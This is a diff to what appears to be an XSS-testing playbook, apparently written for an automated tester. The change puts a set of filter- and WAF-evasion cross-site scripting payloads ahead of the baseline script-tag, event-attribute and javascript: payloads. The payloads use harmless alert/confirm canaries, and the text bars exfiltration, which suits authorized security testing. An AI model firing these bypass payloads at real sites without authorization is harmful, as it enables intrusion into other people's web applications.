@@ -13,24 +13,31 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 
 **Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.
 
-**Try these contexts in order:**
+**Try these contexts in order — start with the Additional payload set.** The comment-boundary and URL-encoded variants survive the filters, WAF signatures and sanitizer allowlists that block a plain `<script>`, so they get first shot:
 
-1. **Inline script injection** (works when HTML context allows new tags):
+1. **Additional payload set first** (the five forms documented under "Additional payload set" below — highest bypass rate, always sent before any baseline payload):
+   ```
+   1<!--><Svg/OnLoad=(confirm)(CANARY)-->
+   1%3C!--%3E%3CSvg%0COnLoad=(confirm)(CANARY)--%3E
+   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
+   %27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(%27CANARY%27)%27+%27%3E%27
+   JavaScript:confirm`CANARY`
+   ```
+
+2. **Inline script injection** (fallback once the additional set is escaped or stripped and new tags are allowed):
    ```
    <script>alert(CANARY)</script>
-   1<!--><Svg/OnLoad=(confirm)(CANARY)-->
-   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
    ```
    Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.
 
-2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
+3. **Attribute event injection** (when `<` is filtered but attributes are injectable):
    ```
    " onmouseover="alert(CANARY)
    " onerror="alert(CANARY)
    " onload="alert(CANARY)
    ```
 
-3. **URL/href context:**
+4. **URL/href context:**
    ```
    javascript:alert(CANARY)
    JavaScript:confirm`(CANARY)`
@@ -179,12 +186,12 @@ $(location
 
 ## Payload & Detection Patterns
 
-**Expanded testing rule — do not stop at the built-in payloads.**  
-For every in-scope reflection or DOM sink, test the existing payloads **and** the additional set below. Treat this list as an additive corpus, not an exhaustive list: derive a small, context-specific set of variants from the observed parser context and filter behavior. Prioritize meaningful variations in tag/attribute case, separators, quote style, whitespace, comment boundaries, URL encoding, and JavaScript syntax. Do not blindly combine every mutation.
+**Expanded testing rule — run the Additional payload set FIRST.**  
+For every in-scope reflection or DOM sink, send the additional payload set below **before** the baseline corpus. Those five forms are the ones that survive modern filters, WAF signatures and sanitizer allowlists, so they answer fastest whether the sink is live; the baseline payloads come after as fallbacks. Treat both lists as an additive corpus, not an exhaustive list: derive a small, context-specific set of variants from the observed parser context and filter behavior. Prioritize meaningful variations in tag/attribute case, separators, quote style, whitespace, comment boundaries, URL encoding, and JavaScript syntax. Do not blindly combine every mutation.
 
 Keep the exact submitted representation and the browser-parsed/decoded representation separate in your notes. Apply URL encoding only when required by the transport layer; do not repeatedly encode a payload or assume that percent-encoded text inside an HTML attribute will be decoded by the browser. For every candidate, verify the final DOM and actual execution in a current browser. Use harmless `confirm()`/`alert()` proofs only; do not turn a proof payload into credential, cookie, token, or data exfiltration.
 
-**Additional payload set — test alongside the existing corpus:**
+**Additional payload set — use FIRST, before the baseline payloads below:**
 
 1. **JavaScript URL scheme with a template literal:**
    ```text
@@ -212,6 +219,8 @@ Keep the exact submitted representation and the browser-parsed/decoded represent
    ```
 
 **Execution and canary handling:** These exact samples intentionally contain short proof values (`K`, `7`, `7110`, and `1`). Preserve and test the supplied forms as written, then create a separate unique-canary variant when recording a finding. A string merely appearing in the HTTP response is reflection, not confirmed XSS. Confirm that the browser parses the input into an executable element/attribute and that the harmless proof runs in the intended origin and context. If a variant is filtered, escaped, normalized, or blocked, record that result and move to the next context-appropriate variant rather than claiming success.
+
+**Baseline corpus — only after the additional set above is filtered, escaped or non-executing:**
 
 **Basic context probing:**
 ```html
